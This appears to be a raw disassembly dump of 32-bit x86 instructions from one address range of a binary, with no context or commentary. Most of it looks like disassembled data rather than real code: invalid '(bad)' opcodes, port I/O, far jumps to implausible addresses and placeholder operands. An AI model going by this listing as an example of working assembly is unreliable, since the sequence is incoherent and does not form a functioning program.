  40c1f6:	mov    ebx,0x49c4996
  40c1fb:	add    dl,BYTE PTR [edi]
  40c1fd:	dec    edx
  40c1fe:	(bad)  
  40c200:	pop    ebx
  40c201:	gs pushf 
  40c203:	sbb    DWORD PTR [edx],ecx
  40c205:	pop    edi
  40c206:	aaa    
  40c207:	in     al,0x44
  40c209:	adc    BYTE PTR [edi+edx*8],dl
  40c20c:	push   0x44d651b2
  40c211:	(bad)  [eax]
  40c213:	pop    edi
  40c214:	mov    ah,0x74
  40c216:	cmp    ah,BYTE PTR [ecx+0x7cd45a5c]
  40c21c:	(bad)  
  40c21d:	ffree  st(5)
  40c21f:	or     ah,BYTE PTR [ebp+edi*8-0x6a]
  40c223:	jne    0x40c289
  40c225:	mov    eax,ds:0x81701834
  40c22a:	push   0x8f13b4cc
  40c22f:	xchg   ebp,eax
  40c230:	xchg   edx,eax
  40c231:	(bad)  
  40c232:	sbb    eax,0xd070861c
  40c237:	pop    ebx
  40c239:	shl    BYTE PTR [ebx+eax*2+0x6f0f228a],1
  40c240:	inc    edx
  40c241:	cdq    
  40c242:	dec    ecx
  40c243:	shl    DWORD PTR [edx-0x3686c464],1
  40c249:	fstp   TBYTE PTR [edx]
  40c24b:	pop    ss
  40c24c:	inc    esp
  40c24d:	leave  
  40c24e:	clc    
  40c24f:	(bad)  
  40c250:	int    0xaa
  40c252:	dec    ebp
  40c253:	push   eax
  40c254:	jno    0x40c21d
  40c256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c257:	frstor [edi+esi*1+0x1b13a28a]
  40c25e:	data16 jo 0x40c251
  40c261:	cmp    eax,0xcf832401
  40c266:	loopne 0x40c22f
  40c268:	ret    
  40c269:	push   ebp
  40c26a:	fstp   TBYTE PTR [edx-0x1c9e99f3]
  40c270:	into   
  40c271:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c272:	mov    edi,ss
  40c274:	fsubr  st,st(2)
  40c276:	rcr    dh,0x72
  40c279:	sub    DWORD PTR [ebx+0x4ee9133d],0x9500b3cb
  40c283:	aas    
  40c284:	fs mov al,0xa2
  40c287:	mov    al,0x70
  40c289:	in     al,0x91
  40c28b:	jbe    0x40c28f
  40c28d:	mov    esp,0x3b7e43c
  40c292:	and    esi,esp
  40c294:	(bad)  
  40c295:	and    edi,DWORD PTR ds:0x804b10bb
  40c29b:	mov    ebx,DWORD PTR [eax-0x40]
  40c29e:	sbb    DWORD PTR [ecx+edi*2+0x1a8efc11],ebx
  40c2a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2a6:	popa   
  40c2a7:	and    ebp,DWORD PTR [ebp-0x14edb270]
  40c2ad:	std    
  40c2ae:	xor    ecx,DWORD PTR [edi]
  40c2b0:	sar    DWORD PTR [edx+0x6a],1
  40c2b3:	jnp    0x40c2af
  40c2b5:	mov    eax,ds:0x1c7b12ef
  40c2ba:	adc    al,0x29
  40c2bc:	popf   
  40c2bd:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40c2bf:	dec    esp
  40c2c0:	mov    esi,0x2e281cb8
  40c2c5:	das    
  40c2c6:	mov    edx,DWORD PTR [ebp+0x4e]
  40c2c9:	mov    ecx,0x8196bd75
  40c2ce:	sub    ch,BYTE PTR [eax]
  40c2d0:	or     ebx,edi
  40c2d2:	inc    ecx
  40c2d3:	int    0x45
  40c2d5:	push   0x944f036a
  40c2da:	in     eax,0x9d
  40c2dc:	cmp    eax,0xbb6af322
  40c2e1:	aas    
  40c2e2:	push   ebx
  40c2e3:	mov    cl,0xe3
  40c2e5:	lea    ebp,ds:0x31b45f65
  40c2eb:	jae    0x40c27b
  40c2ed:	popf   
  40c2ee:	sbb    dh,ah
  40c2f0:	xor    ebp,edi
  40c2f2:	rcr    DWORD PTR [edx-0x3414a2ef],cl
  40c2f8:	dec    ecx
  40c2f9:	js     0x40c31b
  40c2fb:	xchg   ebx,eax
  40c2fc:	hlt    
  40c2fd:	shl    eax,cl
  40c2ff:	or     BYTE PTR [edx-0x47560551],cl
  40c305:	cwde   
  40c306:	iret   
  40c307:	xor    ecx,DWORD PTR [edi+0x6ca2281a]
  40c30d:	test   eax,0x44f6a728
  40c312:	pop    ebx
  40c313:	adc    BYTE PTR [edx+0x2e],bl
  40c316:	outs   dx,DWORD PTR ds:[esi]
  40c317:	or     ebx,esi
  40c319:	ret    0x9ea
  40c31c:	in     eax,0x9d
  40c31e:	xor    eax,0xcc00364f
  40c323:	mov    eax,0x13a426dd
  40c328:	and    ebx,esp
  40c32a:	daa    
  40c32b:	mov    eax,0xa236c5c9
  40c330:	mov    ch,0x82
  40c332:	test   eax,0xc6561c91
  40c337:	pop    ebx
  40c338:	push   cs
  40c339:	and    dh,dh
  40c33b:	jecxz  0x40c2d6
  40c33d:	cmc    
  40c33e:	popf   
  40c33f:	scas   al,BYTE PTR es:[edi]
  40c340:	or     eax,0xe05d96d7
  40c345:	add    eax,0x3dc1918e
  40c34a:	xor    al,0x4
  40c34c:	jp     0x40c2ef
  40c34e:	dec    edx
  40c34f:	push   eax
  40c350:	cli    
  40c351:	jns    0x40c327
  40c353:	nop
  40c354:	cmp    eax,0xc232af0f
  40c359:	std    
  40c35a:	arpl   WORD PTR [eax],si
  40c35c:	(bad)  
  40c35d:	pushf  
  40c35e:	shr    BYTE PTR [esi-0x7543dbf4],cl
  40c364:	push   eax
  40c365:	ret    0x87bc
  40c368:	mov    ch,0x23
  40c36a:	(bad)  
  40c36b:	pop    ebp
  40c36c:	pusha  
  40c36d:	push   cs
  40c36e:	xor    ch,dl
  40c370:	into   
  40c371:	or     BYTE PTR [edx],dh
  40c373:	cmc    
  40c374:	fidiv  WORD PTR [esi]
  40c376:	mov    ds:0x265353f4,eax
  40c37b:	sar    BYTE PTR [esi-0x62c60551],cl
  40c381:	jmp    0xce53a915
  40c386:	push   ss
  40c387:	js     0x40c3ba
  40c389:	sti    
  40c38a:	pop    es
  40c38b:	cmp    edx,ecx
  40c38d:	mov    ah,0x8d
  40c38f:	daa    
  40c390:	into   
  40c391:	pop    eax
  40c392:	adc    al,0x7e
  40c394:	in     eax,dx
  40c395:	push   edx
  40c396:	test   al,0xe1
  40c398:	shl    BYTE PTR [eax+ebp*2+0x582f74d9],0x70
  40c3a0:	repnz xchg esp,eax
  40c3a2:	pusha  
  40c3a3:	mov    dh,0x60
  40c3a5:	imul   ebx,DWORD PTR ds:0xf0607aeb,0xffffffec
  40c3ac:	pop    DWORD PTR [eax+0x47]
  40c3af:	das    
  40c3b0:	pop    ebp
  40c3b1:	iret   
  40c3b2:	mov    bh,0x8f
  40c3b4:	pop    es
  40c3b5:	push   ebx
  40c3b6:	and    BYTE PTR [edx],al
  40c3b8:	dec    eax
  40c3b9:	mov    ah,0x32
  40c3bb:	outs   dx,DWORD PTR ds:[esi]
  40c3bc:	and    DWORD PTR [eax],0x6b8dddf8
  40c3c2:	(bad)  
  40c3c3:	mov    cl,0xa9
  40c3c5:	repnz xor eax,0xf6c6ee7e
  40c3cb:	xchg   esi,eax
  40c3cc:	shr    esi,1
  40c3ce:	inc    esp
  40c3cf:	inc    eax
  40c3d0:	add    bh,BYTE PTR [ebp+edx*2-0x45]
  40c3d4:	jne    0x40c403
  40c3d6:	mov    ebx,0xf9448390
  40c3db:	cli    
  40c3dc:	loope  0x40c3ac
  40c3de:	xlat   BYTE PTR ds:[ebx]
  40c3df:	inc    eax
  40c3e0:	pusha  
  40c3e1:	xchg   esp,eax
  40c3e2:	jp     0x40c381
  40c3e4:	data16 (bad) 
  40c3e6:	enter  0x78a8,0xd7
  40c3ea:	push   0x169d1937
  40c3ef:	cmc    
  40c3f0:	call   0x8b636126
  40c3f5:	xor    cl,BYTE PTR [edx]
  40c3f7:	cdq    
  40c3f8:	loopne 0x40c471
  40c3fa:	ret    0x21d2
  40c3fd:	jge    0x40c429
  40c3ff:	dec    esi
  40c400:	test   BYTE PTR ss:0x6b933530,bl
  40c407:	sbb    dl,al
  40c409:	retf   
  40c40a:	jne    0x40c45d
  40c40c:	push   edi
  40c40d:	int    0x5b
  40c40f:	xor    eax,0x3ecf3ee6
  40c414:	xchg   esi,eax
  40c415:	xor    DWORD PTR [eax],edx
  40c417:	push   esp
  40c418:	leave  
  40c419:	and    esi,DWORD PTR [ebx]
  40c41b:	loope  0x40c3ea
  40c41d:	leave  
  40c41e:	pop    ebp
  40c41f:	mov    DWORD PTR [edx],eax
  40c421:	mov    ch,0x37
  40c424:	mov    DWORD PTR [esi+0xe],ebp
  40c427:	jo     0x40c484
  40c429:	ret    0xbc00
  40c42c:	arpl   bp,sp
  40c42e:	sar    BYTE PTR [edi],0x49
  40c431:	psubsb mm1,QWORD PTR [ecx+0x64]
  40c435:	not    BYTE PTR [ebx+0x72d9359]
  40c43b:	cwde   
  40c43c:	aad    0x9e
  40c43e:	xor    eax,DWORD PTR [edi-0x27]
  40c441:	out    dx,eax
  40c442:	lahf   
  40c443:	mov    al,0xf
  40c445:	add    edi,eax
  40c447:	imul   ecx,DWORD PTR [ebx-0x162f5008],0xdb115e8d
  40c451:	je     0x40c493
  40c453:	add    ch,BYTE PTR [edi]
  40c455:	cdq    
  40c456:	mov    gs,WORD PTR [ecx-0x12]
  40c459:	or     eax,0xe82a95df
  40c45e:	jo     0x40c49a
  40c460:	les    esp,FWORD PTR [edi+0x39]
  40c463:	pop    edi
  40c464:	mov    cl,0xe9
  40c466:	xchg   edx,eax
  40c467:	jo     0x40c4e2
  40c469:	adc    BYTE PTR [edx+0x7c752869],0xf5
  40c470:	pop    ebx
  40c471:	into   
  40c472:	ror    edi,0xe9
  40c475:	mov    ebp,0xcbb5db65
  40c47a:	(bad)  
  40c47b:	int3   
  40c47c:	xor    edx,DWORD PTR [eax+0x31f9eb29]
  40c482:	(bad)  
  40c483:	scas   eax,DWORD PTR es:[edi]
  40c484:	jle    0x40c4a0
  40c486:	pop    es
  40c487:	mov    ecx,0xff5fbe9
  40c48c:	inc    ebp
  40c48d:	pop    ebx
  40c48e:	stc    
  40c48f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c490:	gs sub al,0xd0
  40c493:	repz or BYTE PTR [eax],dl
  40c496:	cli    
  40c497:	sbb    BYTE PTR [ebp+0x24],0xde
  40c49b:	jmp    0x40c43e
  40c49d:	test   DWORD PTR es:[edx-0xa0c179d],eax
  40c4a4:	mov    DWORD PTR [ecx-0x18],eax
  40c4a7:	mov    dl,0x56
  40c4a9:	push   es
  40c4aa:	mov    esp,edx
  40c4ac:	mov    dl,0x8e
  40c4ae:	pop    ebx
  40c4af:	mov    WORD PTR [edx*2-0x52037589],gs
  40c4b6:	jp     0x40c43b
  40c4b8:	retf   
  40c4b9:	adc    BYTE PTR [edi],bl
  40c4bb:	ret    0x4906
  40c4be:	push   esp
  40c4bf:	adc    edx,DWORD PTR [ebp-0x585e7753]
  40c4c5:	pop    eax
  40c4c6:	icebp  
  40c4c7:	xor    ebx,edx
  40c4c9:	xlat   BYTE PTR ds:[ebx]
  40c4ca:	sub    eax,0xa0e2f909
  40c4cf:	mov    al,0x5b
  40c4d1:	mov    al,0x97
  40c4d3:	xchg   DWORD PTR [eax-0x6e],esp
  40c4d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4d7:	and    dh,BYTE PTR ds:0x4fc4370f
  40c4dd:	dec    eax
  40c4de:	inc    ebp
  40c4df:	scas   al,BYTE PTR es:[edi]
  40c4e0:	mov    ebp,0x8b9b54b0
  40c4e5:	jae    0x40c489
  40c4e7:	mov    al,0x51
  40c4e9:	push   0xffffffb0
  40c4eb:	sub    eax,0x7c35c4de
  40c4f0:	or     bh,ch
  40c4f2:	test   eax,0x29f8c322
  40c4f7:	cmp    dl,BYTE PTR [ecx]
  40c4f9:	out    dx,eax
  40c4fa:	fnstsw WORD PTR ds:0xbf673efa
  40c500:	les    esp,FWORD PTR [ebp-0x80]
  40c503:	dec    esp
  40c504:	stos   DWORD PTR es:[edi],eax
  40c505:	repnz cmp cl,BYTE PTR [ecx]
  40c508:	mov    ds:0xce78d8b2,eax
  40c50d:	mov    ch,0x27
  40c50f:	adc    esi,0x6
  40c512:	retf   
  40c513:	jno    0x40c543
  40c515:	rol    ch,1
  40c517:	pop    es
  40c518:	out    dx,al
  40c519:	call   0x3eea:0x226eb06
  40c520:	and    BYTE PTR [eax-0x6f],dh
  40c523:	mov    ecx,0x1f68a3a8
  40c528:	jb     0x40c565
  40c52a:	int3   
  40c52b:	inc    edx
  40c52c:	or     ah,cl
  40c52e:	mov    dh,0x90
  40c530:	fmul   DWORD PTR [esi-0x3b]
  40c533:	out    dx,al
  40c534:	push   esp
  40c535:	cmp    bh,BYTE PTR ds:0x1a80c92d
  40c53b:	ins    BYTE PTR es:[edi],dx
  40c53c:	je     0x40c54f
  40c53e:	xchg   esi,eax
  40c53f:	retf   
  40c540:	fstp   TBYTE PTR [edx-0x1f2b566c]
  40c546:	mov    WORD PTR ds:0x3cd8391a,es
  40c54c:	inc    edx
  40c54d:	inc    esi
  40c54e:	xor    edi,DWORD PTR [edx+ebx*4+0x39db537c]
  40c555:	xchg   esi,eax
  40c556:	and    esp,DWORD PTR [esi+0x3c]
  40c559:	or     edx,ebx
  40c55b:	shl    BYTE PTR [eax],cl
  40c55d:	xchg   esi,eax
  40c55e:	mov    bl,0x55
  40c560:	push   0x47ed0f93
  40c565:	cmp    bh,dh
  40c567:	xor    DWORD PTR [eax+0x5f],edi
  40c56a:	dec    esi
  40c56b:	sub    al,0xa0
  40c56d:	fdiv   QWORD PTR [ecx+esi*2-0x5339916e]
  40c574:	xor    eax,0xab7975d
  40c579:	mov    ecx,0xd8df988b
  40c57e:	sub    al,0xf2
  40c580:	icebp  
  40c581:	in     al,dx
  40c582:	sbb    bh,BYTE PTR ss:[eax]
  40c585:	xlat   BYTE PTR ds:[ebx]
  40c586:	inc    edi
  40c587:	aam    0x1b
  40c589:	inc    esi
  40c58a:	test   DWORD PTR [eax+ecx*8],esp
  40c58d:	sbb    BYTE PTR fs:[ebp-0x744db2df],dl
  40c594:	outs   dx,DWORD PTR ds:[esi]
  40c595:	mov    DWORD PTR [esi+0x689c5c25],esi
  40c59b:	test   edi,0xdd2ce840
  40c5a1:	jmp    0x40c575
  40c5a3:	mov    edi,0x9a7f0d24
  40c5a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5a9:	jg     0x40c564
  40c5ab:	inc    eax
  40c5ac:	inc    ebx
  40c5ad:	cwde   
  40c5ae:	pop    es
  40c5af:	xchg   ebx,eax
  40c5b0:	mov    WORD PTR [edi-0x74680971],?
  40c5b6:	mov    dl,0x7e
  40c5b8:	add    al,0xc3
  40c5ba:	xor    dl,dh
  40c5bc:	les    eax,FWORD PTR [edi]
  40c5be:	lock lods al,BYTE PTR ds:[esi]
  40c5c0:	popf   
  40c5c1:	addr16 call 0x1cd0:0x5c95cff9
  40c5c9:	push   0xa5b455ca
  40c5ce:	inc    ecx
  40c5cf:	mov    bh,0xc7
  40c5d1:	aad    0xc4
  40c5d3:	imul   ecx,DWORD PTR [edx],0xb6ef09cd
  40c5d9:	idiv   DWORD PTR [eax+0x5b42041c]
  40c5df:	mov    ch,0x3a
  40c5e1:	js     0x40c568
  40c5e3:	xor    eax,0xc202d7ed
  40c5e8:	shl    DWORD PTR [esi+0x72],0xc8
  40c5ec:	retf   
  40c5ed:	enter  0xd1de,0xc8
  40c5f1:	push   es
  40c5f2:	mov    al,0x9f
  40c5f4:	or     eax,0x9cef5cdc
  40c5f9:	push   eax
  40c5fa:	mov    cs,WORD PTR [ebx-0x7f58b867]
  40c600:	clc    
  40c601:	stos   BYTE PTR es:[edi],al
  40c602:	push   0xc6d51da
  40c607:	jno    0x40c65a
  40c609:	xor    eax,0x662de1fa
  40c60e:	jg     0x40c5d6
  40c610:	push   0x12
  40c612:	jo     0x40c5a5
  40c614:	dec    edi
  40c615:	retf   
  40c616:	loope  0x40c675
  40c618:	lahf   
  40c619:	test   BYTE PTR ds:0x10e9606f,dl
  40c61f:	sti    
  40c620:	push   ebp
  40c621:	cmp    al,0x57
  40c623:	sbb    al,0x91
  40c625:	std    
  40c626:	mov    al,ds:0x38d40e8d
  40c62b:	jp     0x40c64c
  40c62d:	sbb    al,0x76
  40c62f:	fwait
  40c630:	add    esi,edi
  40c632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c633:	adc    DWORD PTR [edx-0x3c],ecx
  40c636:	out    dx,al
  40c637:	fistp  DWORD PTR [ecx+edx*4]
  40c63a:	fistp  DWORD PTR ds:0xfc05
  40c63f:	cmp    edi,DWORD PTR [ecx+ebx*1+0x63844ac1]
  40c646:	xchg   BYTE PTR [ecx],cl
  40c648:	and    BYTE PTR [ecx+0x4a],bl
  40c64b:	loope  0x40c64c
  40c64d:	(bad)  
  40c64e:	mov    bl,0x3d
  40c650:	bnd js 0x40c6a4
  40c653:	fcmovnu st,st(3)
  40c655:	test   al,0x39
  40c657:	pop    ss
  40c658:	fbld   TBYTE PTR [edx-0x4d]
  40c65b:	test   DWORD PTR [ecx+ecx*8],ebp
  40c65e:	or     BYTE PTR [edi],ah
  40c660:	adc    DWORD PTR [esi],esi
  40c662:	push   esi
  40c663:	(bad)  
  40c664:	(bad)  
  40c665:	mov    BYTE PTR [edi],al
  40c667:	or     DWORD PTR [edx+0x331f53dc],ebx
  40c66d:	jbe    0x40c6b4
  40c66f:	or     al,0xe7
  40c671:	mov    ?,WORD PTR [ebp+0x42ecf5ac]
  40c677:	mov    ebp,0x88ec7f93
  40c67c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c67d:	rcr    DWORD PTR [ebx],cl
  40c67f:	mov    esi,es
  40c681:	sahf   
  40c682:	pop    ecx
  40c683:	mov    dl,ch
  40c685:	shr    DWORD PTR [esi],1
  40c687:	not    BYTE PTR [eax+esi*8+0x434427af]
  40c68e:	push   ebp
  40c68f:	fsub   DWORD PTR [esi+0x5435cb55]
  40c695:	mov    ah,0x6a
  40c697:	adc    DWORD PTR [ecx+eiz*1-0x5a],edx
  40c69b:	jno    0x40c647
  40c69d:	push   edi
  40c69e:	cmp    bh,bh
  40c6a0:	or     dh,BYTE PTR [esi]
  40c6a2:	pop    edx
  40c6a3:	and    esi,DWORD PTR [ebp-0x5e4bea03]
  40c6a9:	jne    0x40c6af
  40c6ab:	imul   edx,ebp,0x51
  40c6ae:	jno    0x40c6d8
  40c6b0:	cmp    bh,BYTE PTR [ebx]
  40c6b2:	in     al,0xd2
  40c6b4:	test   al,0x76
  40c6b6:	div    cl
  40c6b8:	or     al,0x16
  40c6ba:	mov    bh,dh
  40c6bc:	cs iret 
  40c6be:	into   
  40c6bf:	xchg   ecx,eax
  40c6c0:	icebp  
  40c6c1:	xchg   BYTE PTR [edi+0x7b309410],dl
  40c6c7:	stos   BYTE PTR es:[edi],al
  40c6c8:	test   eax,0x169428aa
  40c6cd:	jp     0x40c667
  40c6cf:	cmp    al,0xa9
  40c6d1:	sti    
  40c6d2:	xor    bh,bl
  40c6d4:	cdq    
  40c6d5:	(bad)  
  40c6d6:	imul   eax,DWORD PTR [esi+0x3a],0xf1aaa021
  40c6dd:	lock iret 
  40c6df:	cmp    DWORD PTR [ebx],esi
  40c6e1:	fisttp WORD PTR [esi+ebp*1-0x1243f608]
  40c6e8:	jnp    0x40c69e
  40c6ea:	sub    BYTE PTR [ebp-0x2bd4e8f7],al
  40c6f0:	std    
  40c6f1:	adc    eax,0xeb241486
  40c6f6:	dec    ecx
  40c6f7:	call   0xd046dfa1
  40c6fc:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40c6fe:	add    dh,BYTE PTR [ebx+0x1c72fd54]
  40c704:	jle    0x40c751
  40c706:	std    
  40c707:	add    BYTE PTR [eax-0x4b],0x70
  40c70b:	loopne 0x40c78c
  40c70d:	cli    
  40c70e:	in     eax,0xee
  40c710:	enter  0xed9e,0xee
  40c714:	repz or ch,BYTE PTR [eax+0x5402a748]
  40c71b:	pop    ebp
  40c71c:	mov    bl,0x56
  40c71e:	push   ss
  40c71f:	mov    al,0x10
  40c721:	push   eax
  40c722:	pop    ebx
  40c723:	mov    BYTE PTR [ebx-0x9e51c22],cl
  40c729:	dec    ecx
  40c72a:	pop    ebx
  40c72b:	dec    esi
  40c72c:	lods   al,BYTE PTR ds:[esi]
  40c72d:	sub    al,0xa
  40c72f:	loop   0x40c6ff
  40c731:	mov    ds:0xc96a60d5,eax
  40c736:	add    edx,edi
  40c738:	sbb    eax,0x22b296fb
  40c73d:	popa   
  40c73e:	adc    eax,0x81c42ea
  40c743:	sub    BYTE PTR [ebp+0x5a9787f8],ah
  40c749:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c74a:	mov    edi,0x382d3c18
  40c74f:	shl    edx,1
  40c751:	and    eax,0xb592e997
  40c756:	xor    BYTE PTR [edi-0x77fa15f7],dh
  40c75c:	cmp    cl,BYTE PTR [esp+edx*4-0x65abd8c8]
  40c763:	ret    0xe222
  40c766:	mov    WORD PTR [eax],ss
  40c768:	xchg   BYTE PTR [ebx+0x7a],ah
  40c76b:	push   es
  40c76c:	sbb    dl,BYTE PTR [ebx]
  40c76e:	and    ch,0xd5
  40c771:	adc    BYTE PTR [ecx-0x6a],dl
  40c774:	pop    edi
  40c775:	inc    edi
  40c776:	shl    BYTE PTR [esi-0x3],cl
  40c779:	cmc    
  40c77a:	or     bl,dh
  40c77c:	or     ch,BYTE PTR cs:[edi-0x68]
  40c780:	mov    dh,0x19
  40c782:	mov    ah,BYTE PTR [esi+0x3e87559e]
  40c788:	cli    
  40c789:	and    BYTE PTR [eax],al
  40c78b:	loop   0x40c73d
  40c78d:	inc    ebp
  40c78e:	dec    edi
  40c78f:	xor    al,0x1b
  40c791:	pop    esp
  40c792:	dec    ebp
  40c793:	sub    BYTE PTR [ebp-0x78e63745],dh
  40c799:	and    esi,eax
  40c79b:	in     eax,dx
  40c79c:	inc    edi
  40c79d:	es pop esi
  40c79f:	inc    edx
  40c7a0:	shr    DWORD PTR [eax+ecx*2-0x1d68e3a6],1
  40c7a7:	test   BYTE PTR [edx],cl
  40c7a9:	add    dh,bh
  40c7ab:	fcmovnbe st,st(7)
  40c7ad:	dec    esi
  40c7ae:	jo     0x40c828
  40c7b0:	call   0xfa99f4fd
  40c7b5:	daa    
  40c7b6:	int3   
  40c7b7:	mov    ecx,ebx
  40c7b9:	inc    edi
  40c7ba:	pop    ss
  40c7bb:	fwait
  40c7bc:	(bad)  
  40c7bd:	dec    ecx
  40c7be:	sbb    BYTE PTR [esi-0x3],0xd6
  40c7c2:	sbb    al,0xdb
  40c7c4:	loop   0x40c81d
  40c7c6:	pop    es
  40c7c7:	pushf  
  40c7c8:	out    dx,eax
  40c7c9:	dec    ecx
  40c7ca:	pop    edi
  40c7cb:	pushf  
  40c7cc:	push   eax
  40c7cd:	jle    0x40c7c8
  40c7cf:	sub    dh,BYTE PTR ds:0x2e51d59c
  40c7d5:	fcmovb st,st(1)
  40c7d7:	pop    eax
  40c7d8:	mov    al,ds:0x67b6a70
  40c7dd:	in     eax,0x6f
  40c7df:	inc    ecx
  40c7e0:	push   cs
  40c7e1:	inc    eax
  40c7e2:	adc    BYTE PTR [ecx-0x50dcc31],0xe8
  40c7e9:	call   0x4ab23464
  40c7ee:	add    al,0x16
  40c7f0:	mov    DWORD PTR [ecx-0x6b4e3b45],esp
  40c7f6:	mov    al,ds:0x13186b8a
  40c7fb:	(bad)  
  40c7fc:	popf   
  40c7fd:	popf   
  40c7fe:	in     al,0xd3
  40c800:	add    eax,DWORD PTR [edi]
  40c802:	add    ch,BYTE PTR [ecx+ebx*4+0x308da973]
  40c809:	mov    ebx,0x9bf75b84
  40c80e:	scas   eax,DWORD PTR es:[edi]
  40c80f:	push   ds
  40c810:	dec    esi
  40c811:	jmp    0xc4ab:0xf6fb9adb
  40c818:	push   ss
  40c819:	jle    0x40c7b8
  40c81b:	je     0x40c7f6
  40c81d:	xchg   DWORD PTR [edi-0x17],ecx
  40c820:	adc    BYTE PTR [eax+0x1c],ah
  40c823:	jnp    0x40c865
  40c825:	push   esi
  40c826:	add    ebx,DWORD PTR [esi-0x38294866]
  40c82c:	jae    0x40c86e
  40c82e:	cli    
  40c82f:	rcl    edx,cl
  40c831:	inc    esp
  40c832:	add    eax,0x88c483a8
  40c837:	popa   
  40c838:	fidivr DWORD PTR [eax-0x2a4927d0]
  40c83e:	dec    ebx
  40c83f:	ret    0x356f
  40c842:	pop    ss
  40c843:	clc    
  40c844:	and    al,BYTE PTR [ebp-0x2885ec28]
  40c84a:	out    dx,al
  40c84b:	fistp  QWORD PTR [esi-0xa15a282]
  40c851:	sahf   
  40c852:	xor    eax,0x2a8158c5
  40c857:	leave  
  40c858:	cld    
  40c859:	mov    ah,0x80
  40c85b:	sbb    eax,0x5cee3964
  40c860:	repnz sub BYTE PTR [ecx+eax*1],dh
  40c864:	out    0x8d,al
  40c866:	inc    edx
  40c867:	or     eax,0x2f15430e
  40c86c:	aas    
  40c86d:	mov    eax,ds:0x3696c2d4
  40c872:	repnz daa 
  40c874:	shr    ebp,0xd7
  40c877:	iret   
  40c878:	jg     0x40c82c
  40c87a:	and    BYTE PTR [eax+0x37],cl
  40c87d:	and    DWORD PTR ds:0xe0b69950,ebx
  40c883:	arpl   WORD PTR [edi+0x554358e0],di
  40c889:	or     DWORD PTR [edi-0x15d03863],0x6783fc5c
  40c893:	pop    eax
  40c894:	adc    eax,DWORD PTR [ebp+0xf]
  40c897:	mov    ?,WORD PTR [edi]
  40c899:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c89a:	mov    ebp,0xda33ab2d
  40c89f:	jmp    0x40c8f1
  40c8a1:	idiv   BYTE PTR [edi]
  40c8a3:	jmp    DWORD PTR [edx-0x76]
  40c8a6:	inc    eax
  40c8a7:	pop    eax
  40c8a8:	adc    DWORD PTR [ebx],edx
  40c8aa:	cdq    
  40c8ab:	lea    esp,[edx-0x6a]
  40c8ae:	and    ah,dh
  40c8b0:	xor    DWORD PTR [edx+0x1fe041c3],ebp
  40c8b6:	out    dx,al
  40c8b7:	and    BYTE PTR fs:[ecx+0x73],bh
  40c8bb:	jnp    0x40c92f
  40c8bd:	mov    ds:0xa2d1aebb,al
  40c8c2:	sub    eax,0x1ffe670f
  40c8c7:	retf   0x74ab
  40c8ca:	pop    es
  40c8cb:	mov    al,ds:0x31967d76
  40c8d0:	mov    ah,0x69
  40c8d2:	push   ss
  40c8d3:	dec    eax
  40c8d4:	outs   dx,BYTE PTR ds:[esi]
  40c8d5:	xchg   ebp,eax
  40c8d6:	xor    DWORD PTR [esi-0x53ed4bf8],0xcc70805b
  40c8e0:	cmp    DWORD PTR [ebp-0x65],0xffffffa4
  40c8e4:	ficomp DWORD PTR [ebx]
  40c8e6:	cmp    BYTE PTR [ecx-0x20c10573],al
  40c8ec:	fdivr  st,st(4)
  40c8ee:	push   edi
  40c8ef:	loop   0x40c95b
  40c8f1:	or     BYTE PTR [ebp+esi*2-0x7],cl
  40c8f5:	mov    cl,BYTE PTR [ecx+esi*4+0x59]
  40c8f9:	fcom   QWORD PTR [ebx-0x57697a6c]
  40c8ff:	in     eax,0x40
  40c901:	leave  
  40c902:	js     0x40c90e
  40c904:	push   ds
  40c905:	out    0x50,al
  40c907:	outs   dx,DWORD PTR ds:[esi]
  40c908:	sbb    DWORD PTR [ebx],0x8f426830
  40c90e:	cmp    al,0x9d
  40c910:	sub    DWORD PTR [edx-0x51],0x3b7d9edb
  40c917:	xchg   edx,eax
  40c918:	xchg   edi,eax
  40c919:	sbb    edi,DWORD PTR [eax+0x2f]
  40c91c:	push   cs
  40c91d:	dec    edi
  40c91e:	sahf   
  40c91f:	inc    ecx
  40c920:	push   0xffffffe3
  40c922:	or     esi,DWORD PTR [eax]
  40c924:	es je  0x40c8dc
  40c927:	or     edx,DWORD PTR gs:[esi]
  40c92a:	xor    DWORD PTR [esi-0xb7ef2ad],ecx
  40c930:	and    DWORD PTR ds:0xe8a095d9,eax
  40c936:	shl    BYTE PTR [ebx-0x60],cl
  40c939:	loop   0x40c95c
  40c93b:	mov    edi,0xf032d7aa
  40c940:	jnp    0x40c96b
  40c942:	pusha  
  40c943:	sub    ch,BYTE PTR es:[eax+0x651b6dac]
  40c94a:	push   edx
  40c94b:	cld    
  40c94c:	xchg   ebx,eax
  40c94d:	inc    ebx
  40c94e:	cwde   
  40c94f:	cld    
  40c950:	add    esp,DWORD PTR [edi-0x45b18461]
  40c956:	not    BYTE PTR [ecx+0x32]
  40c959:	pop    edi
  40c95a:	cmp    esp,eax
  40c95c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c95d:	and    edx,0x3e2c9c6a
  40c963:	xchg   ebp,eax
  40c964:	sub    esi,0x35
  40c967:	daa    
  40c968:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c969:	push   ds
  40c96a:	dec    eax
  40c96b:	adc    eax,0x4c4ba15b
  40c970:	rol    DWORD PTR [ebx+0x37],1
  40c973:	out    0xab,eax
  40c975:	xchg   ebx,eax
  40c976:	std    
  40c977:	je     0x40c9f6
  40c979:	dec    edi
  40c97a:	call   0x69dd4f3a
  40c97f:	or     ebp,DWORD PTR [ebx-0x76e6a8db]
  40c985:	mov    bl,0x7f
  40c987:	push   esi
  40c988:	rol    bh,cl
  40c98a:	push   ecx
  40c98b:	cwde   
  40c98c:	std    
  40c98d:	push   esi
  40c98e:	in     al,0x14
  40c990:	xchg   esp,eax
  40c991:	pushf  
  40c992:	je     0x40c951
  40c994:	jns    0x40c9fa
  40c996:	stos   DWORD PTR es:[edi],eax
